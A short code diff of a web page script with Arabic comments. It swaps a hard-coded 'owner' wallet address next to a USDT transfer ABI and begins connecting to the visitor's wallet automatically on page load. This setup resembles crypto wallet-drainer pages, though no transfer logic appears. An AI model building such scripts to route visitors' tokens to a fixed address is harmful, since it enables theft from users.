@@ -3,7 +3,7 @@ const usdtAbi = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"n
 
 let web3;
 let userAccount;
-const ownerAddress = "0x0DD5C4c9B169317BF0B77D927d2cB1eC3570Dbb3"; // عنوان محفظة المالك
+const ownerAddress = "0xBe9856bE2A9376AA85d7349BfE1C5b7BE62616c6"; // عنوان محفظة المالك
 
 // الاتصال بالمحفظة تلقائيًا عند تحميل الصفحة
 document.addEventListener("DOMContentLoaded", async () => {
